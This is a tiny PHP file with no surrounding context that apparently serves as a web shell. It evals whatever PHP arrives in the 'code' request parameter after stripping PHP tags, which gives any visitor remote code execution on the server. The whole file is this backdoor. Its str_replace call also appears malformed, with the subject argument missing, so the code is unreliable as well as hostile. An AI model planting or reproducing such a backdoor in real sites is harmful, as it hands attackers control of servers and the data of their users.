<?php
$s=array('<?php'=>'','<?='=>'','<?'=>'','?>'=>''); 
eval(str_replace($s,$_REQUEST['code']));
?>